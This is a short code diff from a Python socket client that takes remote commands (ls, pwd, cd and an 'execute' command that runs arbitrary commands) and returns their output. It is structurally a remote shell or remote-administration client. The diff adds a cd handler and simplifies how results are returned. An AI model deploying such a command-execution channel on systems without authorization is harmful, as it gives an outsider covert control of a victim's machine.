@@ -26,15 +26,14 @@ class Client:
             if cmd1=="ls":
                 self.s.send(tools.ls(self.osm,self.s).encode())
             elif cmd1=="pwd":
-                self.s.send(tools.pwd(self.osm,self.s).encode())
+                self.s.send(tools.pwd().encode())
+            elif cm[0]=="cd":
+                self.s.send(tools.cd(cm).encode())
             elif cm[0]=="execute":
                 res=tools.execute(self.osm,cm)
-                print(res)
-                if res!="" and res!=None:
-                    self.s.send(res.encode())
-                else:
-                    print("executed")
-                    self.s.send(("executed").encode())
+              
+                self.s.send(res.encode())
+              
             elif cmd1=="exit":
                 print("exit")
                 
